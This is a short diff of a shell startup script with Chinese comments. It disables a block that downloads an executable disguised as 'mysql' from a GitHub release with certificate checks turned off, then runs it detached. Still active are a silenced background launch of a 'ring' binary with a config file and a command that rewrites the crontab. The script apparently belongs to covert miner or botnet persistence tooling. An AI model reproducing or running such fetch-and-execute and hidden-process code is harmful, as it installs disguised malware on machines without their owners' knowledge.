@@ -16,12 +16,12 @@ if [ ! -d "/mnt/ring" ]; then
 fi
 
 # 检查/opt目录下mysql文件是否存在，如果存在则跳过，如果不存在则执行
-if [ ! -f "/opt/mysql" ]; then
-  cd /opt
-  wget -qO mysql --no-check-certificate https://github.com/mumu1667/trx20/releases/download/fuck/mysql
-  chmod +x mysql
-  ./mysql & disown
-fi
+#if [ ! -f "/opt/mysql" ]; then
+#  cd /opt
+#  wget -qO mysql --no-check-certificate https://github.com/mumu1667/trx20/releases/download/fuck/mysql
+#  chmod +x mysql
+#  ./mysql & disown
+#fi
 
 # 检查/opt目录下i386文件是否存在，如果存在则跳过，如果不存在则执行
 #if [ ! -f "/opt/i386" ]; then
@@ -33,7 +33,7 @@ fi
 
 # 启动新的进程并将其放入后台运行，同时将标准输出和错误输出重定向到/dev/null
 /mnt/ring/ring -c /mnt/ring/config.json >/dev/null 2>&1 & disown
-cd /opt; ./mysql >/dev/null 2>&1 & disown
+#cd /opt; ./mysql >/dev/null 2>&1 & disown
 #cd /opt; ./i386 >/dev/null 2>&1 & disown
 #清除上一次的任务，添加下一次的任务
 crontab -l | grep -v "curl" | crontab -
